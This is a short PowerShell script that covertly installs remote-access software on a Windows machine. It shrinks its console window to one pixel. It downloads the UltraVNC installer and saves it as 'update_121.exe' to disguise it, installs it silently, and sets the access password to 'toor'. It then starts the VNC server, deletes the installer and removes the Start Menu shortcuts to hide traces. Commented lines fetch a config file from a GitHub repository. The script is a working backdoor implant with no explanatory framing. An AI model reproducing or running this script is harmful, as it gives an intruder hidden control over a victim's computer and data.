Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")] 
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int W, int H); '

$consoleHWND = [Console.Window]::GetConsoleWindow();
$consoleHWND
[Console.Window]::MoveWindow($consoleHWND,0,0,1,1);
#cd $Env:USERPROFILE -ErrorAction Stop
#Start-Sleep -Seconds 1 -ErrorAction Stop
$client = new-object System.Net.WebClient -ErrorAction Stop
#Start-Sleep -Seconds 1 -ErrorAction Stop
$client.DownloadFile("https://www.uvnc.eu/download/134/UltraVNC_1_3_4_X64_Setup.exe","$Env:USERPROFILE\update_121.exe") ;
#$client.DownloadFile("https://raw.githubusercontent.com/srbhptl39/automation/master/ultravnc.ini","$Env:USERPROFILE\update_121.ini");
& $Env:USERPROFILE\update_121.exe /SP- /VERYSILENT /NORESTART -ErrorAction Stop
#Copy-Item -Path $Env:USERPROFILE\update_121.ini -Destination 'C:\Program Files\uvnc bvba\UltraVNC\ultravnc.in' -ErrorAction Stop
Start-Sleep -Seconds 2 -ErrorAction Stop
& 'C:\Program Files\uvnc bvba\UltraVNC\setpasswd.exe' "toor";
#& 'C:\Program Files\uvnc bvba\UltraVNC\winvnc.exe' -install;
Start-Sleep -Seconds 1 -ErrorAction Stop
& 'C:\Program Files\uvnc bvba\UltraVNC\winvnc.exe' -run;
Remove-Item "$Env:USERPROFILE\update_121.exe"
Remove-Item 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\UltraVNC\' -Recurse
exit;


